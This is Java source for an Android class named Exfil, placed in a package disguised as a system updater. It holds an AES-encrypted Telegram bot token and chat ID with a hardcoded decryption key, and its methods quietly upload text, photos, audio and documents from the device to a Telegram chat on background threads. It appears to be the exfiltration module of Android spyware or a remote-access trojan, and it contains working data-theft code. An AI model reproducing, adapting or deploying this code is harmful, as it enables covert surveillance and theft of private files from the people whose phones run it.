package com.sys.updater;

import android.util.Base64;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Exfil {
    
    private static final String ENC_TOKEN = "GiAyDOTdgj6JrceD11JY4qZzjqbs3OvGCxJPsu+GIeExqfEXcMu0WE9YEr63OdyNwMiuMbVEQ8pwh6dcQJjlzxHq/q7vO9upUQ1C0saW9CZCPBL7iFTsb1no";
    private static final String ENC_CHAT_ID = "hE73YR/q2eyjwkQt3oIa9mxzjwhSz1urMMI9hSWm8aEJDEJmRIKf16ZgPgGpktxWdhpJ7UrX";
    private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; 

    // Zedna hadou bach TelegramService y9der ystafd mn l'Token m-decrypté
    public static String getBotToken() {
        return decrypt(ENC_TOKEN);
    }

    public static String getChatId() {
        return decrypt(ENC_CHAT_ID);
    }

    private static String decrypt(String encryptedText) {
        try {
            byte[] keyBytes = SECRET_KEY.getBytes("UTF-8");
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            byte[] decodedBytes = Base64.decode(encryptedText, Base64.DEFAULT);
            byte[] decryptedBytes = cipher.doFinal(decodedBytes);
            return new String(decryptedBytes, "UTF-8");
        } catch (Exception e) {
            return "ERROR_DECRYPT"; 
        }
    }

    public static void send(String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + getBotToken() + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "chat_id=" + getChatId() + "&text=" + URLEncoder.encode(text, "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
    
    public static void sendFile(String filePath, String type, String caption) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + getBotToken() + "/send" + type;
                String boundary = "*****";
                File file = new File(filePath);
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + getChatId() + "\r\n");
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                }
                
                String fieldName = type.equals("Photo") ? "photo" : (type.equals("Audio") ? "audio" : "document");
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fieldName + "\";filename=\"" + file.getName() + "\"\r\n\r\n");
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
                fis.close();
                
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush(); dos.close();
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
}
